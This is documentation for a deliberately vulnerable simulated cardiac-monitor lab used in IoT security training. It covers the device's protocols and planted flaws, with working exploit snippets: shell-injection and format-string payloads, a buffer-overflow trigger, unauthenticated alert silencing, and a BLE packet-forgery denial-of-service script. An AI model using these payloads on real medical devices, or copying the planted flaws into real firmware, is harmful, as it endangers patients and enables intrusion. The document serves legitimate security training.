# CareOtter — IoT Device Documentation

## Device Overview

CareOtter is a simulated embedded medical device designed for IoT security training. It represents a wearable cardiac monitor that measures heart rate (BPM) and blood oxygen saturation (SpO2) in real time and transmits readings to a companion mobile application and a cloud management API.

The device runs on a **Raspberry Pi 3B/4** under **OpenWRT v24.10.2** and exposes three distinct communication surfaces, each carrying intentional security weaknesses that mirror documented vulnerabilities found in real-world medical IoT devices.

### Hardware and Software Architecture

| Component | Technology |
|-----------|-----------|
| Platform | Raspberry Pi 3B/4 — OpenWRT 24.10.2 |
| Sensor simulator | Python 3 (`simulator.py`) — 10 Hz synthetic BPM/SpO2 |
| HTTP sensor service | Python (`sensor_service.py`) — port 8081 |
| BLE GATT server | Python + `dbus_fast` (`ble_server.py`) — BlueZ |
| Admin service | C binary (`careservice`) — port 9999 |
| Mobile app | Android (Java) — BLE + Cloud API |
| Cloud API | Flask (Docker) — port 5002/5003 |

### Communication Surfaces

```
┌─────────────────────────────────────────────────────────┐
│                    CareOtter Device                     │
│                   (192.168.2.1)                         │
│                                                         │
│  ┌──────────────┐  ┌───────────────┐  ┌─────────────┐  │
│  │  BLE GATT    │  │  HTTP :8081   │  │  IGP :9999  │  │
│  │  ble_server  │  │ sensor_service│  │ careservice │  │
│  └──────┬───────┘  └───────┬───────┘  └──────┬──────┘  │
└─────────┼──────────────────┼─────────────────┼─────────┘
          │ BLE (GATT)       │ HTTP            │ TCP/IGP
          ▼                  ▼                 ▼
   Android App          Cloud API          Attacker /
  (direct vitals)      (proxy)           Admin Tool
```

### Services and Ports

| Port | Protocol | Service | Auth |
|------|----------|---------|------|
| 8081 | HTTP | `sensor_service.py` — vitals and health | None |
| 9999 | TCP binary (IGP v4) | `careservice` — device administration | Hardcoded token |
| BLE | GATT | `ble_server.py` — vitals + thresholds | None |

---

## Protocol Reference

### IGP v4 (IoT Gateway Protocol)

Binary protocol over TCP port 9999. All commands share the same 8-byte header:

```
 0       3  4     5  6     7
┌──────────┬───────┬───────┐
│  Magic   │  Cmd  │  Len  │
│ 0x43415245│      │(BE 16)│
│  "CARE"  │       │       │
└──────────┴───────┴───────┘
```

| Cmd | Name | Auth required | Description |
|-----|------|:---:|-------------|
| `0x01` | SYS_INFO | No | Kernel version and architecture |
| `0x02` | AUTHENTICATE | No | Submit admin token |
| `0x03` | GET_NETWORK | Yes | Returns `/etc/config/wireless` (PSK included) |
| `0x04` | SET_PREFS | Yes | Store UI preferences via TLV |
| `0x05` | VERIFY_STATUS | No | Named subsystem diagnostic |
| `0x06` | SET_WIFI | Yes | Change WiFi SSID/PSK via UCI |
| `0x07` | GET_VITALS | No | Current BPM/SpO2 from sensor service |
| `0x08` | SET_THRESHOLD | Yes | Update BPM/SpO2 alert thresholds |
| `0x09` | REBOOT_SERVICE | Yes | Restart an `init.d` service by name |
| `0x0A` | GET_LOG | Yes | Last 512 bytes of service log |
| `0x0B` | DEFIBRILLATE | Yes | Simulated defibrillator discharge (log event) |
| `0x0C` | EMERGENCY_ALERT  | Yes | Send alert via `curl` to configured endpoint |
| `0x0D` | DEAUTHENTICATE   | No  | Reset `authenticated=0` — session close |
| `0x0E` | GET_THRESHOLD    | No  | Read current clinical thresholds from file |
| `0x0F` | PING             | No  | Connectivity probe — returns `PONG` |
| `0x10` | GET_SIGNATURE    | Yes | Returns factory device signature for patient registration |

### CSCP v1 (CareOtter Secure Config Protocol)

Used over BLE GATT characteristic `0xFF01` to read and write alert thresholds. 24-byte packet:

```
[Magic 4B][CRC32 4B][AES-128-ECB ciphertext 16B]
```

Key hardcoded: `careotter-key-16`. CSCP_MAGIC: `0xCAFE0DDA`.

### Factory Provisioning Channel (BLE)

Hidden GATT service (`0xFF10`) used by clinical technicians to configure the bedside monitor during initial installation. The device ships **without a pre-configured Cloud API endpoint** — the technician must set both WiFi credentials and the Cloud URL via BLE before the monitor can communicate with the hospital backend. The service is **not advertised** in the BLE advertising packet — it only appears during GATT service discovery after connection.

**Manufacturer claim**: auto-disables 30 minutes after first power-on.  
**Reality** (`ble_server.py`): `initialized_at` is recorded but never checked against current time.

**GATT Service — `0000ff10-0000-1000-8000-00805f9b34fb`** (secondary, not advertised):

| Characteristic | UUID | Flags | Function |
|---|---|---|---|
| Provisioning Config | `0000ff11-…` | read, write, notify | JSON command interface |
| Provisioning Auth | `0000ff12-…` | read, write | 4-digit factory PIN |

**Commands (JSON write to `0xFF11`):**

| Command | Body | Action |
|---|---|---|
| `wifi_set` | `{"cmd":"wifi_set","ssid":"...","psk":"..."}` | UCI WiFi configuration |
| `wifi_get` | `{"cmd":"wifi_get"}` | Returns current WiFi state (via read) |
| `cloud_set` | `{"cmd":"cloud_set","url":"http://..."}` | Sets Cloud API endpoint |
| `cloud_get` | `{"cmd":"cloud_get"}` | Returns configured Cloud URL |
| `factory_reset` | `{"cmd":"factory_reset"}` | Wipes configuration |
| `reboot` | `{"cmd":"reboot"}` | Reboots monitor |

**Expected onboarding flow (clinical technician):**
1. Power on bedside monitor.
2. Connect to `CareOtter_HR` via BLE (no pairing required by design).
3. Discover services → find hidden `0xFF10`.
4. Write PIN `6767` to `0xFF12`.
5. Write `{"cmd":"wifi_set","ssid":"HospitalWiFi","psk":"..."}` to `0xFF11`.
6. Write `{"cmd":"cloud_set","url":"http://hospital-cloud.local:5002"}` to `0xFF11`.
7. Channel should auto-close after 30 min (but never does — **P8**).

**Vulnerabilities:**
- **P1** — Hidden but discoverable via service enumeration.
- **P2** — No BLE pairing/bonding required.
- **P3** — Hardcoded PIN `6767`, no rate limiting, no lockout.
- **P4** — `wifi_set` uses `system()` with unescaped SSID/PSK → shell injection.
- **P5** — `ReadValue` returns `wifi_psk` in plaintext.
- **P6** — `cloud_set` accepts arbitrary URLs → SSRF.
- **P7** — `factory_reset` executes on single write without confirmation.
- **P8** — Channel never auto-closes.

---

## CareService — Device Administration (IGP v4)

`careservice` is the C daemon that implements the device administration interface
over TCP `:9999`. It is the component with the largest attack surface in the lab: it exposes
12 binary commands, requires a hardcoded token for authentication, and contains four
exploitable vulnerabilities (format string, integer underflow, shell injection, command
injection).

### IGP Helper — Setup

Save as `igp_helper.py` on the attacker machine. All tests in this section
assume this helper is active:

```python
import socket, struct, sys

MAGIC = 0x43415245

def igp(cmd: int, payload: bytes = b'') -> bytes:
    hdr = struct.pack('>IBBH', MAGIC, cmd, 0, len(payload))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(hdr + payload)
        return s.recv(4096)

if __name__ == '__main__':
    cmd = int(sys.argv[1], 0)
    payload = sys.argv[2].encode() if len(sys.argv) > 2 else b''
    print(igp(cmd, payload).decode('utf-8', errors='replace'))
```

Usage from command line:
```bash
python3 igp_helper.py 0x01
python3 igp_helper.py 0x02 "OtterMobile2026"
```

---

### Commands — Practical Reference

#### 0x01 SYS\_INFO (no authentication)

Returns the Linux kernel version and device architecture.

```python
print(igp(0x01))
# b'v:6.6.104|m:armv7l'
```

---

#### 0x02 AUTHENTICATE (no prior authentication required)

Authenticates the session with the hardcoded token. State persists in a process
global variable — it is not reset when the TCP connection closes (vuln #6).

```python
print(igp(0x02, b'OtterMobile2026'))   # b'AUTH_SUCCESS'
print(igp(0x02, b'WrongToken'))         # b'AUTH_FAIL'
```

> **Note:** Once any connection is authenticated, subsequent connections inherit the state
> until the process is restarted. See vulnerability IoT:I7.

---

#### 0x03 GET\_NETWORK (requires auth)

Returns the raw contents of `/etc/config/wireless`, including SSID and PSK in plaintext.

```python
igp(0x02, b'OtterMobile2026')
print(igp(0x03).decode())
# config wifi-iface 'default_radio0'
#     option ssid 'HomeNetwork'
#     option key  'mypassword123'
```

> **Vuln #2:** The WiFi PSK is exposed to any authenticated client.

---

#### 0x04 SET\_PREFS (requires auth)

Stores UI preferences via a TLV parser. **Contains an integer underflow
that leads to stack BOF** (vuln #3).

Normal TLV format:
```
0xAA [len] [visual theme name]   → e.g. AA 04 44 61 72 6B ("Dark")
0xAB [len] [language code]       → e.g. AB 02 65 73 ("es")
0xAC 01    [screen mode]         → 0x00=day, 0x01=night
```

```python
import struct

igp(0x02, b'OtterMobile2026')

# Normal use: theme "Dark", language "es", night mode
tlv  = b'\xAA\x04Dark'
tlv += b'\xAB\x02es'
tlv += b'\xAC\x01\x01'
print(igp(0x04, tlv))           # b'PREFS_SAVED'

# Exploit underflow: Len=0xFF with only 4 real bytes → crash/BOF
tlv_exploit = b'\xAA\xFF\x41\x41\x41\x41'
print(igp(0x04, tlv_exploit))   # anomalous behavior or segfault
```

---

#### 0x05 VERIFY\_STATUS (no authentication)

Subsystem diagnostic by name. **The payload is passed directly as a format
string to `snprintf`** (vuln #4). Does not require prior authentication.

```python
# Normal use
print(igp(0x05, b'CareOtter'))
# b'Status: CareOtter OK'

# Exploit format string: stack value leak
print(igp(0x05, b'%x.%x.%x.%x'))
# b'1f4.400.0.bffffea8...'
```

---

#### 0x06 SET\_WIFI (requires auth)

Configures SSID and PSK via UCI. **The SSID is interpolated into `system()` without escaping
shell metacharacters** (vuln #5).

Payload format: `"SSID|PSK"` (separated by `|`).

```python
igp(0x02, b'OtterMobile2026')

# Normal use
print(igp(0x06, b'MiRed|mipassword123'))
# b'WIFI_UPDATED'

# Exploit shell injection via SSID
print(igp(0x06, b"' && touch /tmp/pwned #|x"))
# Creates /tmp/pwned on the RPi as root
```

---

#### 0x07 GET\_VITALS (no authentication)

Proxy to `sensor_service.py` — returns the full HTTP response from `:8081/vitals`.

```python
print(igp(0x07))
# b'HTTP/1.0 200 OK\r\nContent-Type: application/json\r\n\r\n'
# b'{"bpm": 72, "spo2": 98, "red_raw": 61085, ...}'
```

---

#### 0x08 SET\_THRESHOLD (requires auth)

Updates the clinical BPM/SpO₂ alert thresholds and persists them to
`/var/log/careotter.thresholds`. `sensor_service.py` automatically reloads them within ≤5s.

TLV format:
```
BB 04 [bpm_min uint16 BE] [bpm_max uint16 BE]
CC 01 [spo2_min uint8]
```

```python
import struct

igp(0x02, b'OtterMobile2026')

# BPM 50–120, SpO₂ min 90%
tlv = struct.pack('>BBHH', 0xBB, 4, 50, 120) + struct.pack('>BBB', 0xCC, 1, 90)
print(igp(0x08, tlv))
# b'THRESHOLD_SET'

# Verify written file (on the RPi):
# cat /var/log/careotter.thresholds
# bpm_min=50
# bpm_max=120
# spo2_min=90
```

> **Note:** Propagation to `sensor_service.py` is verified in the
> [Test Scenarios](#test-scenarios--clinical-threshold-synchronization)
> below.

---

#### 0x09 REBOOT\_SERVICE (requires auth)

Restarts an init.d service by name. **Does not call `waitpid()` after fork —
accumulates zombie processes** (vuln IoT:I8).

```python
igp(0x02, b'OtterMobile2026')

print(igp(0x09, b'medical-sensor'))   # b'SVC_RESTART_QUEUED'
print(igp(0x09, b'careservice'))       # b'SVC_RESTART_QUEUED'
print(igp(0x09, b'ble-server'))        # b'SVC_RESTART_QUEUED'

# Unrecognized service:
print(igp(0x09, b'sshd'))             # b'REBOOT_ERR'
```

---

#### 0x0A GET\_LOG (requires auth)

Returns the last 512 bytes of the careservice log in `/var/log/careservice.log`.

```python
igp(0x02, b'OtterMobile2026')
print(igp(0x0A))
# b'[careservice] Started on port 9999\n...' or b'LOG_EMPTY'
```

---

#### 0x0B DEFIBRILLATE (requires auth)

Simulates a 200 J defibrillator discharge and logs the event to
`/opt/careotter_events.log`. **The payload is used as a format string in the therapy
log** (vuln #11).

```python
igp(0x02, b'OtterMobile2026')

# Normal use
print(igp(0x0B, b'test_event'))
# b'DEFIB_TRIGGERED:200J:1746000000'

# Exploit format string in therapy log
print(igp(0x0B, b'%x.%x.%x.%x'))
# Response: b'DEFIB_TRIGGERED:200J:...'
# /opt/careotter_events.log contains stack values
```

---

#### 0x0C EMERGENCY\_ALERT (requires auth)

Sends an alert to the endpoint configured in `/etc/careotter/alert.conf` via `curl`.
**The message is concatenated without escaping in the shell command** (vuln #12).

```python
igp(0x02, b'OtterMobile2026')

# Normal use
print(igp(0x0C, b'SpO2 below threshold'))
# b'ALERT_SENT:SpO2 below threshold'

# Exploit command injection
print(igp(0x0C, b"normal'; touch /tmp/alert_pwned #"))
# Creates /tmp/alert_pwned on the RPi as root
```

---

#### 0x0D DEAUTHENTICATE (no authentication required)

Resets the global `authenticated` flag to `0`, closing the admin session.
Called by the Cloud API after every protected operation to minimize the window
during which `authenticated=1` is exploitable by direct TCP clients.

```python
# Normal use: close session after a protected command
igp(0x02, b'OtterMobile2026')   # AUTH_SUCCESS
igp(0x03)                        # GET_NETWORK (returns WiFi PSK)
print(igp(0x0D))                 # b'DEAUTH_OK'

# Verify de-auth: next protected command should be rejected
print(igp(0x03))                 # b'RESTRICTED'
```

> **Security note:** `0x0D` does not require prior authentication and cannot
> be used to "lock out" a legitimate session mid-execution. It only resets
> the flag — the race window between the command connection and this connection
> still exists for direct TCP attackers.

---

#### 0x10 GET_SIGNATURE (requires authentication)

Returns the hardcoded factory device signature: **12 hexadecimal characters**
(e.g. `9C0C306DEF2A`). This value is what the installer/administrator must hand
to the patient so they can register the device in the Cloud API via
`POST /api/devices/register-by-hash`.

```python
igp(0x02, b'OtterMobile2026')   # AUTH_SUCCESS
print(igp(0x10))                 # b'9C0C306DEF2A'
```

> **Format change (2026-05-20):** The previous wire format was
> `CareOtter<hex>` (e.g. `9C0C306DEF2A`, 21 chars). The prefix was
> constant for every device and added zero entropy, so it was dropped from
> the device label, from `careservice.c::DEVICE_SIGNATURE`, from the Pi's
> `config.json::device_hash`, and from the cloud's `EXPECTED_DEVICE_SIGNATURE`.
> The cloud still accepts the legacy prefixed form transparently via
> `DatabaseService.canonical_hash` for backward compatibility.

> **Security note:** This endpoint requires authentication, but the signature is
> identical across all CareOtter devices. An attacker who captures it can register
> a rogue device or replay it to a fake cloud. The cloud-side
> `/api/devices/register-by-hash` is now hardened with format guard, per-user
> rate limiting (5 / 15 min), `hmac.compare_digest`, and audit logging — see
> `docs/CareOtter/API/CareOtter_API.md` for the full contract.

---

### Test Scenarios — Clinical Threshold Synchronization

These scenarios verify that thresholds configured via IGP `0x08 SET_THRESHOLD`
propagate correctly to `sensor_service.py`, which uses them in `/alerts` and in the
clinical alert logic of the lab.

#### Scenario A — Automatic Polling ✅ VERIFIED

The watcher in `sensor_service.py` detects changes in `/var/log/careotter.thresholds` by
mtime within ≤5 seconds, with no additional signals or service restart.

**Prerequisites:**
```bash
curl -s http://192.168.2.1:8081/health   # → {"status":"ok",...}
nc -zv 192.168.2.1 9999                  # → Connected
```

**1. Read base threshold:**
```bash
curl -s http://192.168.2.1:8081/alerts | python3 -m json.tool
# "thresholds": {"bpm_min": 40, "bpm_max": 120, "spo2_min": 90}
```

**2. Set `bpm_max=60` to force alert (simulated BPM ~72 > 60):**
```python
import struct

igp(0x02, b'OtterMobile2026')
tlv = struct.pack('>BBHH', 0xBB, 4, 50, 60) + struct.pack('>BBB', 0xCC, 1, 95)
print(igp(0x08, tlv))   # THRESHOLD_SET
```

**3. Verify file written on the RPi:**
```bash
ssh root@192.168.2.1 'cat /var/log/careotter.thresholds'
# bpm_min=50
# bpm_max=60
# spo2_min=95
```

**4. Wait ≤5s and verify propagation:**
```bash
sleep 6
curl -s http://192.168.2.1:8081/alerts | python3 -m json.tool
# EXPECTED RESULT:
# "thresholds": {"bpm_min": 50, "bpm_max": 60, "spo2_min": 95}
# "bpm_high": true   ← simulated BPM ~72 exceeds bpm_max=60
```

> ✅ **Status:** Verified. Synchronization works correctly within ≤5s after
careservice writes the file. The watcher detects the mtime change and applies the
new thresholds without manual intervention.

---

#### Scenario B — Manual SIGHUP ⏳ Pending test

Verifies that the SIGHUP handler in `sensor_service.py` reloads the file
immediately without waiting for the 5s polling cycle.

```bash
# 1. Write thresholds directly on the RPi
ssh root@192.168.2.1 'printf "bpm_min=25\nbpm_max=55\nspo2_min=98\n" > /var/log/careotter.thresholds'

# 2. Send SIGHUP — instant reload
ssh root@192.168.2.1 'kill -HUP $(pgrep -f sensor_service.py)'

# 3. Verify without sleep (reload should be immediate)
curl -s http://192.168.2.1:8081/alerts | python3 -m json.tool
# EXPECTED: "thresholds": {"bpm_min": 25, "bpm_max": 55, "spo2_min": 98}
```

> ⏳ **Status:** Pending test on physical device.

---

#### Scenario C — Load at boot ⏳ Pending test

Verifies that if `/var/log/careotter.thresholds` exists before `sensor_service.py`
starts, the thresholds are loaded directly from the file instead of using the
in-memory defaults (`bpm_min=40, bpm_max=120, spo2_min=90`).

```bash
# 1. Pre-write the file BEFORE starting the service
ssh root@192.168.2.1 'printf "bpm_min=45\nbpm_max=80\nspo2_min=92\n" > /var/log/careotter.thresholds'

# 2. Restart sensor_service
ssh root@192.168.2.1 '/etc/init.d/medical-sensor restart'

# 3. Verify active thresholds right after startup (no IGP 0x08 at all)
sleep 2
curl -s http://192.168.2.1:8081/alerts | python3 -m json.tool
# EXPECTED: "thresholds": {"bpm_min": 45, "bpm_max": 80, "spo2_min": 92}
# The defaults (40/120/90) were never used: the file overwrote them at startup
```

> ⏳ **Status:** Pending test on physical device.

---

## Push Architecture & Cron Hardening

> **Changed:** 2026-05-20 — inverted the data direction so the device is the
> initiator. Documented here for operators who diagnose data flow.

### Direction of Traffic

```
                       cloud_uploader.py (Pi cron, every 60s)
                       loops internally every 10s for the full minute
                                       │
                                       ▼
sensor_service.py ── /vitals  ─►  cloud_uploader  ── POST /api/device/vitals ─►  Cloud (SQLite)
(127.0.0.1:8081)    loopback           │           HTTPS plaintext over WiFi
                                       └────────── POST /api/device/alerts  ─►  Cloud (SQLite)
```

The Cloud no longer polls the Pi. The only request the cloud still issues to
the Pi is a periodic `/health` for MAC/WiFi-IP resolution
(`app.py::_fetch_device_mac` background thread, 60s interval).

### `cloud_uploader.py` Contract

`labs/careotter/files/opt/medical-sensor/cloud_uploader.py` runs as a
60-second cron job. Inside each run it loops 6 × 10s, so the cloud receives a
fresh row every 10s without the Pi keeping a long-running daemon (cheaper on
the BCM2837 + simpler to restart on failure).

Each iteration:

1. `_sensor_get("/vitals", api_key)` — GET loopback HTTP on `127.0.0.1:8081`.
2. `_sensor_get("/alerts/history?since=<watermark>", api_key)` — only events
   newer than `/tmp/careotter_alert_watermark`.
3. POST both to `{cloud_endpoint}/api/device/vitals` and `…/alerts` with
   headers `X-Device-MAC` (eth0 MAC) + `X-Device-Hash` (12-hex factory code).
4. On success, advance the alert watermark to the newest sent timestamp.

Configuration source: `/opt/medical-sensor/config.json::cloud_endpoint`. The
script appends `/api/device/...` itself — do NOT include that suffix in
`cloud_endpoint`. Valid examples:

```json
"cloud_endpoint" : "http://192.168.2.2:5002"     // PC over Ethernet
"cloud_endpoint" : "http://192.168.1.50:5002"    // PC over WiFi
```

### Cron Hardening — `60-cron.sh`

Busybox crond on OpenWRT has two silent failure modes that hit us during
the 2026-05-19 lab session:

1. **`cronloglevel` defaults to 8** → only daemon start/stop appears in
   `logread`, dispatch lines (`USER root pid X cmd Y`) are suppressed.
   Indistinguishable from "cron not firing" without instrumentation.
2. **Wrong file ownership/mode on `/etc/crontabs/root`** → busybox crond
   *silently ignores* crontabs not owned by root or that are
   group/other-writable. SCP-ing the overlay from a dev box leaves the file
   as uid 1000:1000 mode 0664 → zero jobs ever fire, no log line.

`labs/careotter/files/usr/lib/vulnzoo-hooks/profile-init.d/60-cron.sh` now
normalises both at every device profile load:

```sh
uci set system.@system[0].cronloglevel='0'
uci commit system

chown root:root /etc/crontabs/root
chmod 600       /etc/crontabs/root

/etc/init.d/cron enable && /etc/init.d/cron restart
```

After this, every job dispatch shows up in `logread`:

```
cron.info crond[…]: USER root pid X cmd /usr/bin/env python3 /opt/medical-sensor/cloud_uploader.py >/dev/null 2>&1
```

### Cloud-Authoritative Timestamps (RPi has no RTC)

The Raspberry Pi 3B+ has no battery-backed clock. After a cold boot it
returns whatever epoch its filesystem was last updated with (often days or
weeks in the past) until NTP kicks in. The Pi `cloud_uploader` sends rows
tagged with `time.time()` from the Pi → if the Pi clock is 26h behind, every
row falls outside the Cloud's "last 24h" filter and the dashboard shows
empty graphs.

Fixed in `app.py::device_push_vitals` and `device_push_alerts`:

```python
# Cloud clock is authoritative — overwrite the Pi-supplied timestamp.
data['timestamp'] = time.time()
db.store_vitals(data, device_mac=mac)

# Same for alerts:
now_ts = time.time()
for event in data.get('alerts', []):
    event['timestamp'] = now_ts
    db.store_alert(event, device_mac=mac)
```

Loses real measurement precision (≤10s scatter due to push cadence) in
exchange for graphs that always render. If sub-10s precision matters
clinically, replace with NTP sync on the Pi instead.

### Placeholder-MAC Adoption

`initialize_iot` seeds the Pi's row at lab boot. If `/health` is unreachable
at seed time, the MAC is stored as `00:00:00:00:00:00`. On the Pi's first
real push, `device_push_vitals` looks up by `X-Device-MAC` → 404, then
falls back to lookup by `X-Device-Hash`. If a placeholder row matches,
`DatabaseService.adopt_mac_for_signature` atomically rewrites that row's MAC
in-place so subsequent pushes take the fast path:

```python
device = db.get_device_by_mac(mac)
if not device:
    if db.adopt_mac_for_signature(auth_hash, mac):
        device = db.get_device_by_mac(mac)
```

This makes the order of operations (cloud seed vs Pi first boot)
irrelevant.

### Verification Recipes

```sh
# Cron is firing
ssh root@192.168.2.1 'logread | grep "cmd /usr/bin/env python3"'

# Outbound POSTs leaving the Pi
ssh root@192.168.2.1 'tcpdump -i any -nn "tcp port 5002" -c 4'

# Manual single run (skip the wait for cron)
ssh root@192.168.2.1 'python3 /opt/medical-sensor/cloud_uploader.py'
# expect: [Uploader] Vitals pushed → 200

# Cloud-side ingest visible
docker logs careotter-api 2>&1 | grep -E 'POST /api/device/(vitals|alerts)' | tail -5

# Rows landing with current timestamp
docker exec careotter-api sqlite3 /app/data/careotter.db \
  "SELECT datetime(timestamp,'unixepoch'), device_mac, bpm, spo2
     FROM vitals_readings ORDER BY id DESC LIMIT 5;"
```

---

## Vulnerabilities

### IoT:I1 — Weak, Guessable, or Hardcoded Credentials

#### 1.1 Hardcoded admin token in `careservice` binary

The `careservice` C daemon authenticates clients via a token comparison against a compile-time constant:

```c
#define ADMIN_TOKEN "OtterMobile2026"
```

The token is visible in plaintext by running `strings` on the binary:

```bash
$ strings /opt/careotter/careservice | grep Otter
OtterMobile2026
```

Any network-reachable client can authenticate to the IGP service without any additional credential. This matches the pattern of hardcoded credentials found in many embedded device administration interfaces.

**Exploitation:**

```python
import socket, struct

MAGIC = 0x43415245

def igp(ip, cmd, payload=b''):
    hdr = struct.pack('>IBBH', MAGIC, cmd, 0, len(payload))
    with socket.create_connection((ip, 9999), timeout=5) as s:
        s.sendall(hdr + payload)
        return s.recv(4096)

print(igp('192.168.2.1', 0x02, b'OtterMobile2026'))
# b'AUTH_SUCCESS'
```

**References:** OWASP IoT Top 10 — I1 · CWE-798

---

#### 1.2 Hardcoded AES key in BLE CSCP protocol

The BLE threshold characteristic uses AES-128-ECB with a key hardcoded in both the firmware and the Android APK:

```python
CSCP_KEY = b"careotter-key-16"   # ble_server.py:436
```

An attacker who extracts the key via static analysis of either the firmware or the decompiled APK can forge valid CSCP v1 packets and overwrite alert thresholds without any authentication handshake.

**References:** OWASP Mobile M1 — Improper Credential Usage · CWE-321

---

### IoT:I2 — Insecure Network Services

#### 2.1 IGP service with no transport encryption

The administration service listens on TCP port 9999 with no TLS. All commands, including the authentication token and the full WiFi configuration (SSID + PSK), are transmitted in cleartext over the Ethernet link.

```bash
$ nmap -p 9999 192.168.2.1
PORT     STATE SERVICE
9999/tcp open  unknown
```

A passive observer on the `192.168.2.0/24` segment can capture the admin token and the WiFi PSK with a single `tcpdump` session.

#### 2.2 HTTP sensor service with no authentication

Port 8081 exposes real-time vitals, history, and a `POST /thresholds` endpoint with no authentication:

```bash
$ curl -s http://192.168.2.1:8081/vitals
{"bpm": 72, "spo2": 98, "timestamp": 1746000000.0}

# Unauthenticated threshold overwrite:
$ curl -s -X POST http://192.168.2.1:8081/thresholds \
    -H "Content-Type: application/json" \
    -d '{"bpm_min": 0, "bpm_max": 255, "spo2_min": 0}'
{"status": "thresholds updated"}
```

Silencing all clinical alerts without any credentials constitutes a patient safety risk.

**References:** OWASP IoT Top 10 — I2 · CWE-306

---

### IoT:I3 — Insecure Ecosystem Interfaces

#### 3.1 BLE ManufacturerData leaks Cloud API address

The BLE advertising payload (Company ID `0x08D4`) encodes the Cloud API IP and port in a 10-byte binary field that any passive BLE scanner can read without pairing or connecting:

```
Bytes [0:4]  → Cloud API IPv4
Bytes [4:6]  → Cloud API port
Bytes [6:10] → Device WiFi IPv4
```

Using nRF Connect or any BLE sniffer, an attacker in Bluetooth range discovers the management API endpoint before performing any active attack.

```
nRF Connect → CareOtter_HR → RAW AD → Manufacturer Specific (0x08D4)
→ c0 a8 01 62 13 8a c0 a8 02 01
→ API: 192.168.1.98:5002  Device: 192.168.2.1
```

**References:** OWASP IoT Top 10 — I3 · CWE-200

#### 3.2 Device information GATT characteristics leak simulator metadata

The Device Information service exposes manufacturer name and model number characteristics that reveal the internal implementation:

- Manufacturer Name (`0x2A29`): returns the Python version and OpenWRT platform string
- Model Number (`0x2A24`): returns `MAX30102-SIM`, revealing the device is running in simulation mode

This information aids an attacker in identifying the exact software stack and targeting known vulnerabilities.

**References:** OWASP IoT Top 10 — I3 · CWE-200

#### 3.3 DoS via ZeroDivisionError in BLE AlertThreshold characteristic (CVE-lab-BLE-001)

##### Description

`AlertThresholdChrc.WriteValue` accepts GATT writes without authentication or pairing. When a client writes a valid CSCP v1 packet with `bpm_min >= bpm_max`, the global variable `_alert_bpm_window` ends up with value `<= 0`. The crash does not occur immediately but is **deferred**: the asyncio task `update_and_notify()` runs every 2 seconds via `update_loop()`, and on its first cycle after the write it calls `_compute_alert_window()`, which performs division by `_alert_bpm_window`. The uncaught `ZeroDivisionError` kills the asyncio task, permanently stopping all BLE notifications until the process is manually restarted.

This deferred crash pattern complicates triage: `WriteValue` responds with success, the process remains visible in `ps`, but notifications silently cease ~2 seconds later.

##### OWASP Classification

| Category | Role |
|-----------|-----|
| **I3 — Insecure Ecosystem Interfaces** | Primary — write to configuration characteristic without authentication or pairing |
| **I7 — Insecure Data Transfer** | Secondary — no semantic validation of received payload (`bpm_max > bpm_min`) |
| **I9 — Insecure Default Settings** | Contributing — no watchdog or automatic asyncio task restart |

##### Complete Attack Chain

**Step 1 — Static reconnaissance (OWASP Mobile M1)**

Extract the CSCP key and characteristic UUID from the APK:

```bash
# Decompile the APK
apktool d careotter_app.apk -o careotter_decompiled
# or with jadx:
jadx careotter_app.apk -d careotter_src

# Search for AES key and UUID
grep -r "careotter-key" careotter_src/
grep -r "0000ff01"      careotter_src/
```

Expected result:
```
CSCP_KEY  = b"careotter-key-16"      # in ble_server.py / BleMonitorClient.java
CHAR_UUID = "0000ff01-0000-1000-8000-00805f9b34fb"
```

**Step 2 — Passive BLE discovery**

Confirm that `CareOtter_HR` exposes characteristic `0xFF01` with `write` flag:

```bash
# With bleak (Python)
python3 -c "
import asyncio
from bleak import BleakScanner, BleakClient

async def discover():
    devs = await BleakScanner.discover(timeout=5)
    for d in devs:
        if d.name == 'CareOtter_HR':
            print(f'Found: {d.address}')
            async with BleakClient(d.address) as c:
                for svc in c.services:
                    for chrc in svc.characteristics:
                        if 'ff01' in chrc.uuid:
                            print(f'  UUID={chrc.uuid} props={chrc.properties}')

asyncio.run(discover())
"
```

Expected output:
```
Found: B8:27:EB:XX:XX:XX
  UUID=0000ff01-0000-1000-8000-00805f9b34fb  props=['read', 'write', 'notify']
```

**Step 3 — Forge CSCP v1 payload**

Build a valid 24-byte packet with `bpm_min=100, bpm_max=100` (window = 0):

```python
# Requires: pip install pycryptodome
import struct, binascii
from Crypto.Cipher import AES

CSCP_KEY   = b"careotter-key-16"
CSCP_MAGIC = 0xCAFE0DDA

def forge_cscp(bpm_min: int, bpm_max: int, spo2_min: int) -> bytes:
    """Forge a valid 24-byte CSCP v1 packet."""
    plaintext  = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
    ciphertext = AES.new(CSCP_KEY, AES.MODE_ECB).encrypt(plaintext)
    crc        = binascii.crc32(ciphertext) & 0xFFFFFFFF
    return struct.pack(">II", CSCP_MAGIC, crc) + ciphertext

# Malicious payload: bpm_min == bpm_max → _alert_bpm_window = 0
payload = forge_cscp(bpm_min=100, bpm_max=100, spo2_min=90)
print(f"Payload ({len(payload)}B): {payload.hex()}")
```

**Step 4 — Exploitation**

Write the payload to characteristic `0xFF01`:

```python
import asyncio, struct, binascii
from bleak import BleakScanner, BleakClient
from Crypto.Cipher import AES

CSCP_KEY   = b"careotter-key-16"
CSCP_MAGIC = 0xCAFE0DDA
CHAR_UUID  = "0000ff01-0000-1000-8000-00805f9b34fb"
DEVICE_NAME = "CareOtter_HR"

def forge_cscp(bpm_min, bpm_max, spo2_min):
    pt  = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
    ct  = AES.new(CSCP_KEY, AES.MODE_ECB).encrypt(pt)
    crc = binascii.crc32(ct) & 0xFFFFFFFF
    return struct.pack(">II", CSCP_MAGIC, crc) + ct

async def exploit():
    devs = await BleakScanner.discover(timeout=5)
    target = next((d for d in devs if d.name == DEVICE_NAME), None)
    if not target:
        print("Device not found"); return

    async with BleakClient(target.address) as client:
        payload = forge_cscp(100, 100, 90)   # window = 0
        await client.write_gatt_char(CHAR_UUID, payload, response=True)
        print("[*] Write accepted — crash deferred ~2s")
        # WriteValue returns success immediately
        # ZeroDivisionError fires in update_and_notify() on next 2s tick

asyncio.run(exploit())
```

**Step 5 — DoS Verification**

```bash
# On the Raspberry Pi — before attack: notifications active
ssh root@192.168.2.1 "ps | grep ble_server"
# → shows the process

# Monitor log after attack
ssh root@192.168.2.1 "tail -f /var/log/ble_server.log 2>/dev/null || logread -f | grep BLE"
# → after ~2s the traceback appears:
